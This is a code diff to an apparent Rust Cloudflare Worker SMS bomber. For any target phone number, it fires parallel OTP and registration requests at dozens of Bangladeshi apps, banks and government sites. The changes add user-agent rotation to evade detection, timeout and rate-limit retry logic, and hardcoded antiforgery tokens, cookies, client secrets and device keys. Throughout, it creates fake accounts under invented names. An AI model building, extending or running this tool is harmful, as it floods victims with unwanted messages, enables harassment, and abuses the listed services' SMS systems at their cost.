@@ -2,6 +2,7 @@ use worker::*;
 use serde_json::{json, Value};
 use wasm_bindgen_futures::JsFuture;
 use wasm_bindgen::JsValue;
+use js_sys::Function;
 
 // ══════════════════════════════════════════════════════
 //  🚫 BLOCKED NUMBERS
@@ -19,29 +20,71 @@ const USER_AGENTS: &[&str] = &[
     "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
     "okhttp/4.12.0",
+    "okhttp/4.11.0",
     "okhttp/4.9.3",
+    "okhttp/3.14.9",
     "Dart/3.2 (dart:io)",
     "Dart/2.19 (dart:io)",
     "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230805.001)",
+    "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)",
 ];
 
+// ══════════════════════════════════════════════════════
+//  🔄 ACCEPT-LANGUAGE POOL
+// ══════════════════════════════════════════════════════
 const ACCEPT_LANGS: &[&str] = &[
     "en-US,en;q=0.9",
     "en-GB,en;q=0.9",
     "en-US,en;q=0.9,bn;q=0.8",
     "bn-BD,bn;q=0.9,en;q=0.8",
+    "en;q=0.9",
 ];
 
+// ══════════════════════════════════════════════════════
+//  🎲 FAST PSEUDO-RANDOM
+// ══════════════════════════════════════════════════════
 fn pseudo_rand(seed: u64) -> u64 {
     let mut x = seed ^ 0x9e3779b97f4a7c15u64;
     x = (x ^ (x >> 30)).wrapping_mul(0xbf58476d1ce4e5b9u64);
     x = (x ^ (x >> 27)).wrapping_mul(0x94d049bb133111ebu64);
     x ^ (x >> 31)
 }
-fn get_ua(seed: u64)   -> &'static str { USER_AGENTS[(pseudo_rand(seed) as usize) % USER_AGENTS.len()] }
-fn get_lang(seed: u64) -> &'static str { ACCEPT_LANGS[(pseudo_rand(seed.wrapping_add(1)) as usize) % ACCEPT_LANGS.len()] }
+
+fn get_ua(seed: u64) -> &'static str {
+    USER_AGENTS[(pseudo_rand(seed) as usize) % USER_AGENTS.len()]
+}
+
+fn get_lang(seed: u64) -> &'static str {
+    ACCEPT_LANGS[(pseudo_rand(seed.wrapping_add(1)) as usize) % ACCEPT_LANGS.len()]
+}
+
+// ══════════════════════════════════════════════════════
+//  ⏱ WORKER-SAFE SLEEP
+//  web_sys::window() Cloudflare Workers এ নেই
+//  js_sys::global() দিয়ে ServiceWorkerGlobalScope পাওয়া যায়
+// ══════════════════════════════════════════════════════
+fn set_timeout_worker(callback: &Function, ms: i32) -> Result<()> {
+    let global = js_sys::global();
+    let set_timeout = js_sys::Reflect::get(&global, &JsValue::from_str("setTimeout"))
+        .map_err(|_| worker::Error::RustError("no setTimeout".into()))?;
+    let set_timeout: Function = set_timeout.dyn_into()
+        .map_err(|_| worker::Error::RustError("setTimeout not a function".into()))?;
+    set_timeout.call2(&JsValue::NULL, callback, &JsValue::from_f64(ms as f64))
+        .map_err(|_| worker::Error::RustError("setTimeout call failed".into()))?;
+    Ok(())
+}
+
+fn sleep_promise(ms: i32) -> js_sys::Promise {
+    js_sys::Promise::new(&mut |resolve, _| {
+        let _ = set_timeout_worker(&resolve, ms);
+    })
+}
 
 // ══════════════════════════════════════════════════════
 //  CORS
@@ -56,14 +99,94 @@ pub fn cors_headers() -> Headers {
 }
 
 // ══════════════════════════════════════════════════════
-//  FIRE — direct fetch, no window/setTimeout
-//  Workers WASM এ window object নেই তাই remove করা হয়েছে
+//  FIRE ONCE — single attempt with 8s timeout
+// ══════════════════════════════════════════════════════
+async fn fire_once(
+    name:    &'static str,
+    url:     &'static str,
+    payload: &Value,
+    headers: &[(&'static str, &'static str)],
+    seed:    u64,
+) -> Value {
+    let mut init = RequestInit::new();
+    init.with_method(Method::Post);
+
+    let mut h = Headers::new();
+    let mut has_ua           = false;
+    let mut has_content_type = false;
+    let mut has_accept       = false;
+
+    for (k, v) in headers {
+        let key_lower = k.to_lowercase();
+        if key_lower == "user-agent"   { has_ua = true; }
+        if key_lower == "content-type" { has_content_type = true; }
+        if key_lower == "accept"       { has_accept = true; }
+        let _ = h.set(k, v);
+    }
+
+    if !has_ua           { let _ = h.set("User-Agent",   get_ua(seed)); }
+    if !has_content_type { let _ = h.set("Content-Type", "application/json"); }
+    if !has_accept       { let _ = h.set("Accept",       "application/json, text/plain, */*"); }
+    let _ = h.set("Accept-Language", get_lang(seed));
+
+    init.with_headers(h);
+    init.with_body(Some(payload.to_string().into()));
+
+    // ── 8 second timeout using js_sys::global() ──
+    let timeout_promise = sleep_promise(8000);
+
+    let fetch_promise = match Request::new_with_init(url, &init) {
+        Ok(req) => wasm_bindgen_futures::future_to_promise(async move {
+            match Fetch::Request(req).send().await {
+                Ok(mut r) => {
+                    let s  = r.status_code();
+                    let ok = s == 200 || s == 201 || s == 202;
+                    let v  = json!({"api": name, "status": s, "ok": ok});
+                    Ok(JsValue::from_str(&v.to_string()))
+                }
+                Err(e) => {
+                    let v = json!({"api": name, "status": 0, "ok": false, "err": e.to_string()});
+                    Ok(JsValue::from_str(&v.to_string()))
+                }
+            }
+        }),
+        Err(e) => {
+            return json!({"api": name, "status": 0, "ok": false, "err": e.to_string()});
+        }
+    };
+
+    // timeout_promise resolves to undefined on timeout (reject নয়)
+    // fetch_promise resolves to json string
+    // race: যেটা আগে শেষ হয় সেটা জেতে
+    let timeout_wrapped = wasm_bindgen_futures::future_to_promise(async move {
+        JsFuture::from(timeout_promise).await.ok();
+        Ok(JsValue::from_str(
+            &json!({"api": name, "status": 0, "ok": false, "err": "timeout"}).to_string()
+        ))
+    });
+
+    let race = js_sys::Promise::race(&js_sys::Array::of2(&fetch_promise, &timeout_wrapped));
+    match JsFuture::from(race).await {
+        Ok(val) => {
+            let s = val.as_string().unwrap_or_default();
+            serde_json::from_str(&s).unwrap_or(json!({"api": name, "status": 0, "ok": false}))
+        }
+        Err(_) => json!({"api": name, "status": 0, "ok": false, "err": "race failed"}),
+    }
+}
+
+// ══════════════════════════════════════════════════════
+//  FIRE — retry logic
+//  ✓ success → return
+//  4xx → no retry
+//  429 → wait 800ms → retry with different UA
+//  0/5xx → retry once with different UA
 // ══════════════════════════════════════════════════════
 async fn fire(
     name:    &'static str,
     url:     &'static str,
     payload: Value,
-    extra:   &[(&'static str, &'static str)],
+    headers: &[(&'static str, &'static str)],
 ) -> Value {
     let base_seed: u64 = name.bytes()
         .enumerate()
@@ -71,81 +194,30 @@ async fn fire(
             acc.wrapping_add((b as u64).wrapping_mul(i as u64 + 1))
         });
 
-    // 2 বার try করবে
-    for attempt in 0u8..2 {
+    for attempt in 0..2u8 {
         let seed = pseudo_rand(base_seed.wrapping_add(attempt as u64));
+        let r    = fire_once(name, url, &payload, headers, seed).await;
 
-        let mut init = RequestInit::new();
-        init.with_method(Method::Post);
+        let ok     = r["ok"].as_bool().unwrap_or(false);
+        let status = r["status"].as_u64().unwrap_or(0);
 
-        let mut h = Headers::new();
+        if ok { return r; }
 
-        // API specific headers
-        let mut has_ua    = false;
-        let mut has_ct    = false;
-        let mut has_acc   = false;
-        for (k, v) in extra {
-            let kl = k.to_lowercase();
-            if kl == "user-agent"   { has_ua  = true; }
-            if kl == "content-type" { has_ct  = true; }
-            if kl == "accept"       { has_acc = true; }
-            let _ = h.set(k, v);
+        if matches!(status, 400 | 401 | 403 | 404 | 405 | 410 | 422 | 451) {
+            return r;
         }
 
-        // Default fallback headers
-        if !has_ua  { let _ = h.set("User-Agent",    get_ua(seed)); }
-        if !has_ct  { let _ = h.set("Content-Type",  "application/json"); }
-        if !has_acc { let _ = h.set("Accept",         "application/json, text/plain, */*"); }
-        let _ = h.set("Accept-Language", get_lang(seed));
-
-        init.with_headers(h);
-        init.with_body(Some(payload.to_string().into()));
-
-        let result = match Request::new_with_init(url, &init) {
-            Ok(req) => match Fetch::Request(req).send().await {
-                Ok(mut r) => {
-                    let s  = r.status_code();
-                    let ok = s == 200 || s == 201 || s == 202;
-                    json!({"api": name, "status": s, "ok": ok, "url": url})
-                }
-                Err(e) => json!({"api": name, "status": 0, "ok": false, "url": url, "err": e.to_string()}),
-            },
-            Err(e) => json!({"api": name, "status": 0, "ok": false, "url": url, "err": e.to_string()}),
-        };
-
-        let ok     = result["ok"].as_bool().unwrap_or(false);
-        let status = result["status"].as_u64().unwrap_or(0);
-
-        // success → return
-        if ok { return result; }
-
-        // 4xx → retry বেকার
-        if matches!(status, 400|401|403|404|405|410|422|451) { return result; }
-
-        // last attempt → return
-        if attempt == 1 { return result; }
-
-        // 429 rate limit → 500ms wait করে retry
-        if status == 429 {
-            let wait = js_sys::Promise::new(&mut |resolve, _| {
-                // Workers এ setTimeout আছে globalThis তে
-                let global = js_sys::global();
-                let set_timeout = js_sys::Reflect::get(&global, &JsValue::from_str("setTimeout"))
-                    .unwrap_or(JsValue::UNDEFINED);
-                if set_timeout.is_function() {
-                    let func = js_sys::Function::from(set_timeout);
-                    let _ = func.call2(&JsValue::UNDEFINED, &resolve, &JsValue::from_f64(500.0));
-                } else {
-                    // setTimeout না থাকলে সরাসরি resolve
-                    let _ = js_sys::Function::from(resolve).call0(&JsValue::UNDEFINED);
-                }
-            });
-            let _ = JsFuture::from(wait).await;
+        if status == 429 && attempt == 0 {
+            let _ = JsFuture::from(sleep_promise(800)).await;
+            continue;
         }
-        // অন্য error → সরাসরি retry (no wait)
+
+        if attempt == 0 { continue; }
+
+        return r;
     }
 
-    json!({"api": name, "status": 0, "ok": false, "url": url})
+    json!({"api": name, "status": 0, "ok": false})
 }
 
 // ══════════════════════════════════════════════════════
@@ -192,23 +264,25 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
 
     if number_str.is_empty() {
         return Ok(Response::ok(
-            json!({"status":"error","message":"Number missing"}).to_string(),
+            json!({"status": "error", "message": "Number missing"}).to_string(),
         )?.with_headers(headers));
     }
 
-    // Block check
     let is_blocked = BLOCKED_NUMBERS.iter().any(|&b| {
         let n  = number_str.trim_start_matches('0');
         let bn = b.trim_start_matches('0');
-        number_str == b || n == bn
+        number_str == b
+            || n == bn
             || format!("880{n}") == b
             || number_str == format!("880{bn}")
     });
 
     if is_blocked {
         return Ok(Response::ok(json!({
-            "status":"blocked","message":"This number is protected.",
-            "target":number_str,"success":0,"failed":0,"total":0,"results":[]
+            "status":  "blocked",
+            "message": "This number is protected.",
+            "target":  number_str,
+            "success": 0, "failed": 0, "total": 0, "results": []
         }).to_string())?.with_headers(headers));
     }
 
@@ -218,6 +292,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
     let plus_bd: &'static str = Box::leak(format!("+88{number_str}").into_boxed_str());
 
     let api_results = parallel![
+
         fire("Shadhin Music",
             "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
             json!({"msisdn": bd_full, "shortcode": 16235, "servicename": "Shadhin Music"}),
@@ -276,7 +351,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         fire("Deepto Play",
             "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
             json!({"number": plus_bd}),
-            &[("Content-Type","application/json"),("Origin","https://www.deeptoplay.com")]
+            &[("Host","api.deeptoplay.com"),("Content-Type","application/json"),("Origin","https://www.deeptoplay.com")]
         ),
         fire("RedX",
             "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
@@ -311,7 +386,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         fire("Easy BD",
             "https://core.easy.com.bd/api/v1/registration",
             json!({"password": "445566", "password_confirmation": "445566", "name": "Team Dangerous", "mobile": number, "referrer_key": "", "email": "dangerousboytushar@gmail.com"}),
-            &[("Content-Type","application/json"),("lang","en"),("device-key","48b1f7061f48c950090220f62128b2c3")]
+            &[("Content-Type","application/json"),("Host","core.easy.com.bd"),("lang","en"),("device-key","48b1f7061f48c950090220f62128b2c3")]
         ),
         fire("MyGuardian BD",
             "https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp",
@@ -331,7 +406,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         fire("NRB Bazaar",
             "https://www.nrbbazaar.com/Customer/RequestOtpForRegistration",
             json!({"phoneNumber": number, "email": "example@gmail.com", "__RequestVerificationToken": "CfDJ8OTdK55f1KtKpMVto1XODz36P2tWXfyeot9aYuxWqkd81qABD_JFUva73ce2L5ftYmqCgwInZKUHisKU3mWb6DkYgBFDg4QIej8YwHP3BQ3fQvgBfc6mbMjVua7p-AT4MEPtgYhLexJmTxl7enCosqA"}),
-            &[("Content-Type","application/x-www-form-urlencoded")]
+            &[("Content-Type","application/x-www-form-urlencoded"),("Cookie",".Nop.Antiforgery=CfDJ8N5UM1Mg0_JFs4qu7TCIBSzGu689vm8mbvSPQ743hQSg8CQN0NF_XzfjEsi78OgkEPagdV_jE0-Bv17i3ToM1axTnWqbYcicXyGSwLVIJt-Jpak2l8yoNfuDZsgWG4Hlg4xPW4OOpCtcsf5xmMkdvFk")]
         ),
         fire("Medico Bio",
             "https://api.v2.medico.bio/patient/passwordless-login",
@@ -351,7 +426,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         fire("Porter BD",
             "https://customerapp-gateway-ktor.prod.porter.ae/onboarding/customer/signup",
             json!({"phone": number}),
-            &[("content-type","application/json"),("country","bd"),("preferred-languages","{\"app_language\":\"en\"}"),("brand","porter"),("source","android"),("version-name","6.7.0"),("custom-app-version-code","410"),("user-agent","Dalvik/2.1.0")]
+            &[("content-type","application/json"),("country","bd"),("preferred-languages","{\"app_language\":\"en\"}"),("brand","porter"),("source","android"),("version-name","6.7.0"),("custom-app-version-code","410"),("client-request-uuid","88c7743e-d714-4735-ad05-339e43cf8e73"),("installation-id","0eb9e8bc-9725-4bd5-a382-fe92c716b3c7"),("app-session-id","4699341c-6f94-4481-af99-041b43d24623"),("user-agent","Dalvik/2.1.0")]
         ),
         fire("FSIB Freedom",
             "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber",
@@ -366,17 +441,17 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         fire("Ghoori Learning",
             "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
             json!({"mobile_no": number}),
-            &[("Content-Type","application/json"),("Referer","https://ghoorilearning.com/")]
+            &[("Content-Type","application/json"),("Host","api.ghoorilearning.com"),("Referer","https://ghoorilearning.com/")]
         ),
         fire("ExpressHub",
             "https://expresshub.com.bd/User/CreateNewUser",
             json!({"_UID": number, "_UNAME": "0", "_MAIL": "0", "_PHONE": "0", "_PASS": "0", "_TYPE": "1"}),
-            &[("Content-Type","application/x-www-form-urlencoded")]
+            &[("Content-Type","application/x-www-form-urlencoded"),("Origin","https://expresshub.com.bd")]
         ),
         fire("Pharmaid RX",
             "https://shop.pharmaid-rx.com/api/sendSMSRegistration",
             json!({"mobileNumber": number}),
-            &[("Content-Type","application/json")]
+            &[("Content-Type","application/json"),("Host","shop.pharmaid-rx.com")]
         ),
         fire("Practice Club",
             "https://www.practiceclub.net/api/register",
@@ -391,12 +466,12 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         fire("PBS BD",
             "https://pbs.com.bd/login/?handler=UserGetOtp",
             json!({"UserName": "Teamdanderous", "UserPassword": "Tushar", "MobileNo": number}),
-            &[("Content-Type","application/json")]
+            &[("Content-Type","application/json"),("XSRF-Token","CfDJ8C8FhGbSUB1CplCwhmaw48FrjIGNq5sPRk0G6VzBicZtPJrEXDCoqGMiBTb3Fetxypt-480avEXqJS_WJVdEWQeDCz0mKIQO4odODIqIopHM8qh50R7CF3bOGHOtF22Pt-pgeyMhHQTk2t2inqJMRyw"),("Cookie",".AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8C8FhGbSUB1CplCwhmaw48HSKnE-hppep13XT5NAyk3laCHJb_oP0B1wPBZQP-hzP8Z2CAclzIeEqkFAMeWJS8xWzyiIMY_sMlsO7WzVcxmONd9WUDnzazvUlK9zFOY8h6Pwx1xsDD9fgtr2ltr9qHE;")]
         ),
         fire("Dutch Bangla NX",
             "https://nxpay1.dutchbanglabank.com/user/register",
             json!({"aspId": "5678", "locale": "EN", "msisdn": number, "registrationUserId": number, "tcidList": [50], "telcoId": "GP"}),
-            &[("Content-Type","application/json"),("X-KM-User-AspId","5678"),("X-KM-Accept-language","en"),("X-KM-OS-SERVICE-TYPE","GMS"),("X-KM-User-Agent","ANDROID/100046615"),("User-Agent","okhttp/4.9.3")]
+            &[("Content-Type","application/json"),("X-KM-User-AspId","5678"),("X-KM-Accept-language","en"),("X-KM-OS-SERVICE-TYPE","GMS"),("X-KM-User-Agent","ANDROID/100046615"),("Host","nxpay1.dutchbanglabank.com"),("User-Agent","okhttp/4.9.3")]
         ),
         fire("One Fish",
             "https://api.onefish.app/api/auth/user/sendotp",
@@ -421,12 +496,12 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         fire("Easy BD Reg",
             "https://core.easy.com.bd/api/v1/registration",
             json!({"name": "Rahat", "email": "chowa@gmail.com", "mobile": number, "password": "123456", "password_confirmation": "123456", "device_key": "48b1f7061f48c950090220f62128b2c3"}),
-            &[("Content-Type","application/json"),("lang","en"),("device-key","48b1f7061f48c950090220f62128b2c3")]
+            &[("Content-Type","application/json"),("Host","core.easy.com.bd"),("lang","en"),("device-key","48b1f7061f48c950090220f62128b2c3")]
         ),
         fire("Osud Kini",
             "https://api.osudkini.com/api/otp/generate-otp",
             json!({"phoneNo": number}),
-            &[("Content-Type","application/json")]
+            &[("Content-Type","application/json"),("Connection","keep-alive")]
         ),
         fire("ABC Lit",
             "https://abclit.com/api/sendOTP",
@@ -466,7 +541,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         fire("Bepari App",
             "https://api.bepari.app/bestfreshfarm/api/V1.4/access-control/user/registerOtp",
             json!({"client_id": 4, "client_secret": "zCzOixaOJ4JywQr1VsowGZhCaEbZ49WLxweNBgPK", "mobile_no": number}),
-            &[("Content-Type","application/json")]
+            &[("Content-Type","application/json"),("Origin","https://www.bestfreshfarm.com")]
         ),
         fire("Training Gov BD",
             "https://training.gov.bd/backoffice/api/user/sendOtp",
@@ -496,7 +571,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         fire("Walton Amar Awaz",
             "https://walton-amar-awaz-prod.com/api/user/signup",
             json!({"email": "", "fbId": "", "fullName": "User", "gId": "", "phone": number}),
-            &[("Content-Type","application/json"),("version-code","1.4.7"),("user-agent","okhttp/4.7.2")]
+            &[("Content-Type","application/json"),("accept","application/json"),("version-code","1.4.7"),("authorization","Bearer"),("user-agent","okhttp/4.7.2")]
         ),
         fire("ACS Future School",
             "https://auth.acsfutureschool.com/api/v1/otp/send",
@@ -507,13 +582,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
             "https://meenabazardev.com/api/mobile/front/send/otp",
             json!({"CellPhone": number, "type": "login"}),
             &[("Content-Type","application/x-www-form-urlencoded")]
-        ),
-
-        // নতুন API যোগ করার format:
-        // fire("নাম", "https://url",
-        //     json!({"phone": number}),
-        //     &[("Content-Type","application/json")]
-        // ),
+        )
     ];
 
     let success = api_results.iter().filter(|r| r["ok"].as_bool().unwrap_or(false)).count() as u32;
